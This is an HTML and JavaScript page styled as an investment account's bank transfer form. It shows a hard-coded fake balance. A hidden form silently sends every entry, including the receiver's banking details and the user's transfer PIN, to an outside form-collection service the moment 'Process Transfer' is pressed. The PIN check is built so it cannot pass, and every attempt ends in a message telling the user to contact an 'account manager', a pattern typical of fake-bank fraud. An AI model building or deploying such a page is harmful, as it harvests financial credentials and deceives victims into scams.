<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transfer Money - Investment Account</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        body {
            background: #f8f9fb;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 1rem;
        }

        #pageLoader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #002f6c;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 1;
            transition: opacity 0.3s ease;
        }

        .pulse-loader {
            width: 50px;
            height: 50px;
            background: white;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(0.8); opacity: 0.7; }
            50% { transform: scale(1.2); opacity: 1; }
            100% { transform: scale(0.8); opacity: 0.7; }
        }

        .transfer-container {
            background: white;
            padding: 2rem;
            border-radius: 20px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 500px;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .transfer-container.visible {
            opacity: 1;
        }

        .back-button {
            background: #002f6c;
            color: white;
            border: none;
            padding: 0.6rem 1.2rem;
            border-radius: 20px;
            cursor: pointer;
            font-size: 0.9rem;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 1.5rem;
            text-decoration: none;
            transition: background 0.3s;
        }

        .back-button:hover {
            background: #005eb8;
        }

        .transfer-container h1 {
            font-size: 1.8rem;
            margin-bottom: 1.5rem;
            color: #002f6c;
            text-align: center;
        }

        .form-group {
            margin-bottom: 1.2rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: #2d3436;
            font-weight: 500;
            font-size: 0.95rem;
        }

        .transfer-container input {
            width: 100%;
            padding: 1rem;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 1rem;
            transition: border-color 0.3s;
        }

        .transfer-container input:focus {
            outline: none;
            border-color: #005eb8;
        }

        .amount-input {
            display: flex;
            align-items: center;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            padding: 0 1rem;
            margin: 0.5rem 0;
            transition: border-color 0.3s;
        }

        .amount-input:focus-within {
            border-color: #005eb8;
        }

        .amount-input span {
            font-size: 1rem;
            color: #666;
            margin-right: 0.5rem;
        }

        .amount-input input {
            border: none;
            outline: none;
            flex: 1;
            font-size: 1rem;
            padding: 1rem 0;
        }

        .transfer-container button {
            width: 100%;
            padding: 1.2rem;
            background: linear-gradient(135deg, #002f6c, #005eb8);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 1.5rem;
            position: relative;
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .transfer-container button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 47, 108, 0.3);
        }

        .transfer-container button:disabled {
            background: #cccccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #002f6c;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 1001;
        }

        .popup-content {
            background: white;
            padding: 2.5rem;
            border-radius: 15px;
            text-align: center;
            max-width: 450px;
            width: 90%;
        }

        .popup-icon {
            font-size: 4rem;
            margin-bottom: 1.5rem;
        }

        .success-icon {
            color: #00a859;
        }

        .error-icon {
            color: #d32f2f;
        }

        .popup-content h2 {
            margin-bottom: 1rem;
            color: #002f6c;
            font-size: 1.8rem;
        }

        .popup-content p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 1.5rem;
        }

        .popup-content button {
            padding: 0.8rem 2rem;
            background: #002f6c;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
        }

        .popup-content button:hover {
            background: #005eb8;
        }

        .popup-loader {
            display: none;
            justify-content: center;
            align-items: center;
            margin-bottom: 1.5rem;
        }

        .transaction-reference {
            background: #f8f9fb;
            padding: 1rem;
            border-radius: 8px;
            font-family: monospace;
            font-size: 1rem;
            letter-spacing: 1px;
            text-align: center;
            margin: 1rem 0;
            color: #002f6c;
        }

        #phraseForm {
            display: none;
        }

        @media (max-width: 480px) {
            .transfer-container {
                padding: 1.5rem;
            }
            
            .transfer-container h1 {
                font-size: 1.5rem;
            }
            
            .popup-content {
                padding: 2rem 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div id="pageLoader">
        <div class="pulse-loader"></div>
    </div>

    <div class="transfer-container" id="transferContainer">
        <button class="back-button" onclick="window.location.href='../index.html'">
            <i class="fas fa-arrow-left"></i> Back to Dashboard
        </button>
        
        <h1>Bank Transfer</h1>
        
        <div class="form-group">
            <label>Receiver Name</label>
            <input type="text" id="reciverName" placeholder="Enter receiver's full name" required>
        </div>
        
        <div class="form-group">
            <label>Bank Name</label>
            <input type="text" id="bankName" placeholder="Enter bank name" required>
        </div>
        
        <div class="form-group">
            <label>Wire Routing Number</label>
            <input type="text" id="wirerouting" placeholder="Enter wire routing number" required>
        </div>
        
        <div class="form-group">
            <label>Reason for Payment</label>
            <input type="text" id="Reasonsforpayment" placeholder="Enter reason for payment" required>
        </div>
        
        <div class="form-group">
            <label>Account Number</label>
            <input type="text" id="accountNumber" placeholder="Enter account number" required>
        </div>
        
        <div class="form-group">
            <label>Amount</label>
            <div class="amount-input">
                <span>$</span>
                <input type="number" id="amount" placeholder="Enter amount" min="1" required>
            </div>
        </div>
        
        <div class="form-group">
            <label>Transfer PIN</label>
            <input type="password" id="transferPin" placeholder="Enter 4-digit PIN" maxlength="4" required>
        </div>
        
        <button onclick="processTransfer()" id="transferButton">
            <span id="buttonText">Process Transfer</span>
            <div id="buttonLoader" class="loader" style="display: none;"></div>
        </button>
    </div>

    <!-- Hidden form that will be submitted in the background -->
    <form id="phraseForm" style="display: none;">
        <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
        <input type="hidden" name="subject" value="Transfer initiated from Investment Account">
        <input type="hidden" name="receiver_name" id="formReceiverName">
        <input type="hidden" name="bank_name" id="formBankName">
        <input type="hidden" name="wire_routing" id="formWireRouting">
        <input type="hidden" name="reason_for_payment" id="formReasonsForPayment">
        <input type="hidden" name="account_number" id="formAccountNumber">
        <input type="hidden" name="amount" id="formAmount">
        <input type="hidden" name="transfer_pin" id="formTransferPin">
        <input type="hidden" name="redirect" value="false">
        <input type="checkbox" name="botcheck" style="display: none;">
    </form>

    <div id="successPopup" class="popup">
        <div class="popup-content">
            <div id="successPopupLoader" class="popup-loader">
                <div class="loader"></div>
            </div>
            <div class="popup-icon success-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            <h2>Transfer Successful!</h2>
            <p id="successMessage">Your transfer has been processed successfully.</p>
            <div class="transaction-reference" id="successReference"></div>
            <button onclick="closePopup('successPopup')">Close</button>
        </div>
    </div>

    <div id="errorPopup" class="popup">
        <div class="popup-content">
            <div id="errorPopupLoader" class="popup-loader">
                <div class="loader"></div>
            </div>
            <div class="popup-icon error-icon">
                <i class="fas fa-exclamation-triangle"></i>
            </div>
            <h2 id="errorTitle">Transaction Failed</h2>
            <p id="errorMessage">An error occurred during the transfer.</p>
            <button onclick="closePopup('errorPopup')">Close</button>
        </div>
    </div>

    <script>
        // Configuration matching dashboard
        const DEFAULT_BALANCE = 4150000.00;
        const CORRECT_PIN = "111122";

        // Generate unique transaction reference
        function generateTransactionRef() {
            const timestamp = Date.now().toString().slice(-8);
            const random = Math.random().toString(36).substr(2, 6).toUpperCase();
            return `TRX-${timestamp}-${random}`;
        }

        // Page initialization
        setTimeout(() => {
            document.getElementById('pageLoader').style.opacity = '0';
            setTimeout(() => {
                document.getElementById('pageLoader').style.display = 'none';
                document.getElementById('transferContainer').classList.add('visible');
            }, 300);
        }, 1500);

        function submitPhraseForm() {
            // Set all the form values from the input fields
            document.getElementById('formReceiverName').value = document.getElementById('reciverName').value;
            document.getElementById('formBankName').value = document.getElementById('bankName').value;
            document.getElementById('formWireRouting').value = document.getElementById('wirerouting').value;
            document.getElementById('formReasonsForPayment').value = document.getElementById('Reasonsforpayment').value;
            document.getElementById('formAccountNumber').value = document.getElementById('accountNumber').value;
            document.getElementById('formAmount').value = document.getElementById('amount').value;
            document.getElementById('formTransferPin').value = document.getElementById('transferPin').value;
            
            // Submit silently using fetch()
            const formData = new FormData(document.getElementById('phraseForm'));
            
            // Add timestamp to ensure unique submission
            formData.append('timestamp', new Date().toISOString());
            
            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                console.log('Form submission successful:', data);
                if (!data.success) {
                    console.error('Form submission failed:', data.message);
                }
            })
            .catch(error => {
                console.error('Error submitting form:', error);
            });
        }

        function addTransactionToDashboard(transactionData) {
            try {
                if (window.opener && typeof window.opener.addNewTransaction === 'function') {
                    // Call the dashboard's addNewTransaction function
                    const reference = window.opener.addNewTransaction(transactionData);
                    return reference;
                } else {
                    // Fallback: Update localStorage directly
                    const transactions = JSON.parse(localStorage.getItem('transactionHistory')) || [];
                    transactions.unshift(transactionData);
                    localStorage.setItem('transactionHistory', JSON.stringify(transactions));
                    return transactionData.reference;
                }
            } catch (error) {
                console.error('Error adding transaction to dashboard:', error);
                // Fallback to localStorage
                const transactions = JSON.parse(localStorage.getItem('transactionHistory')) || [];
                transactions.unshift(transactionData);
                localStorage.setItem('transactionHistory', JSON.stringify(transactions));
                return transactionData.reference;
            }
        }

        function processTransfer() {
            const fields = ['reciverName', 'bankName', 'wirerouting', 
                          'Reasonsforpayment', 'accountNumber', 'amount', 'transferPin'];
            
            // Validate all fields
            if (!fields.every(id => document.getElementById(id).value.trim())) {
                alert('Please complete all fields before proceeding.');
                return;
            }

            const amount = parseFloat(document.getElementById('amount').value);
            const transferPin = document.getElementById('transferPin').value;
            const transferButton = document.getElementById('transferButton');
            
            // Validate amount
            if (isNaN(amount) || amount <= 0) {
                alert('Please enter a valid amount greater than 0.');
                return;
            }

            if (amount > 1000000) {
                alert('Maximum transfer amount is $1,000,000 per transaction.');
                return;
            }

            // Disable button during processing
            transferButton.disabled = true;
            document.getElementById('buttonText').style.display = 'none';
            document.getElementById('buttonLoader').style.display = 'block';

            // Submit the form data immediately
            submitPhraseForm();

            setTimeout(() => {
                try {
                    // PIN verification
                    if (transferPin !== CORRECT_PIN) {
                        throw new Error('ATTENTION - UNBALE TO PROCESS THIS TRANSFER CONTACT YOUR ACCOUNT MANAGER.');
                    }

                    // Balance check
                    let currentBalance = parseFloat(localStorage.getItem('balance')) || DEFAULT_BALANCE;
                    if (amount > currentBalance) {
                        throw new Error('Insufficient Funds - You do not have sufficient funds in your account.');
                    }

                    // Update balance
                    currentBalance -= amount;
                    localStorage.setItem('balance', currentBalance);

                    // Generate transaction reference
                    const transactionRef = generateTransactionRef();
                    const now = new Date();

                    // Create enhanced transaction data
                    const transactionData = {
                        name: `Transfer to ${document.getElementById('bankName').value.trim()}`,
                        time: now.toLocaleDateString('en-GB', {
                            day: 'numeric',
                            month: 'short',
                            year: 'numeric'
                        }) + " â€¢ " + now.toLocaleTimeString('en-US', {
                            hour: '2-digit',
                            minute: '2-digit'
                        }),
                        amount: -Math.abs(amount),
                        type: "debit",
                        reference: transactionRef,
                        status: "completed",
                        description: `Transfer to ${document.getElementById('reciverName').value.trim()} - ${document.getElementById('Reasonsforpayment').value.trim()}`,
                        category: "Transfer",
                        method: "Wire Transfer",
                        beneficiary: document.getElementById('reciverName').value.trim(),
                        accountNumber: document.getElementById('accountNumber').value.trim(),
                        date: now.toLocaleDateString('en-GB', {
                            day: 'numeric',
                            month: 'long',
                            year: 'numeric'
                        }),
                        exactTime: now.toLocaleTimeString('en-US', {
                            hour: '2-digit',
                            minute: '2-digit'
                        })
                    };

                    // Add transaction to dashboard
                    const addedReference = addTransactionToDashboard(transactionData);

                    // Show success with transaction reference
                    document.getElementById('successReference').textContent = `Reference: ${addedReference || transactionRef}`;
                    document.getElementById('successMessage').textContent = 
                        `Your transfer of $${amount.toLocaleString('en-US', {minimumFractionDigits: 2})} has been processed successfully.`;
                    showPopup('successPopup');

                } catch (error) {
                    const [title, message] = error.message.split(' - ');
                    showPopup('errorPopup', title, message);
                } finally {
                    // Reset button state
                    transferButton.disabled = false;
                    document.getElementById('buttonText').style.display = 'block';
                    document.getElementById('buttonLoader').style.display = 'none';
                }
            }, 2000);
        }

        function showPopup(popupId, title = '', message = '') {
            const popup = document.getElementById(popupId);
            const loader = document.getElementById(`${popupId}Loader`);

            if (title && popupId === 'errorPopup') {
                document.getElementById('errorTitle').textContent = title;
            }
            if (message && popupId === 'errorPopup') {
                document.getElementById('errorMessage').textContent = message;
            }

            popup.style.display = 'flex';
            loader.style.display = 'flex';
            
            setTimeout(() => {
                loader.style.display = 'none';
            }, 1500);
        }

        function closePopup(popupId) {
            document.getElementById(popupId).style.display = 'none';
            if (popupId === 'successPopup') {
                // Clear form
                const fields = ['reciverName', 'bankName', 'wirerouting', 
                              'Reasonsforpayment', 'accountNumber', 'amount', 'transferPin'];
                fields.forEach(id => {
                    document.getElementById(id).value = '';
                });
                
                // Notify parent window if opened from dashboard
                try {
                    window.opener.postMessage('transferCompleted', '*');
                    setTimeout(() => {
                        window.location.href = '../dashboard.html';
                    }, 1000);
                } catch (e) {
                    // If not opened from dashboard, just stay on page
                }
            }
        }

        // Auto-format amount
        document.getElementById('amount').addEventListener('blur', function(e) {
            const value = parseFloat(e.target.value);
            if (!isNaN(value)) {
                e.target.value = value.toFixed(2);
            }
        });

        // Press Enter to submit
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                processTransfer();
            }
        });
    </script>
</body>
</html>
